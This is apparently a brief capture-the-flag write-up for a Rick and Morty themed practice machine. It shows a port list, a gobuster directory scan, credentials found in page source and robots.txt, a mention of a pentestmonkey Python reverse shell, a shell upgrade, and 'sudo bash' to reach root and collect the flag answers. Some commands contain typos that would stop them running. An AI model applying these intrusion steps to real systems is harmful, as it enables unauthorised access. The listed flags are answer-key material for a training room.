# BASIC INFO

```
export IP=10.10.152.123


open port:
	22/tcp OpenSSH 7.2p2
	80/tcp Apache httpd2.4.18
```

Run gobuster on the ip
```
gobuster dir -u http://10.10.152.123 --wrodlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,sh,cgi,css,txt,html,js,py


```

# CREDENTIALS

On the website page source
username = R1ckRul3s

In robots.txt
Wubbalubbadubdub

# EXPLOIT

```
grep . *
```
1st ingredient = mr. meeseek hair

# REVERSE SHELL
use python reverse shell from pentestmonkey
using python3 since python not recognized by the OS

```
python3 -c "impoty pty; pty.spawn('/bin/bash')"
ctrl^z
stty raw -echo
fg
export TERM=xterm

```

# REMAINING INGREDIENT

```
cd /home/rick
2nd ingredient = 1 jerry tear

sudo bash
3rd ingredient = fleeb juice
```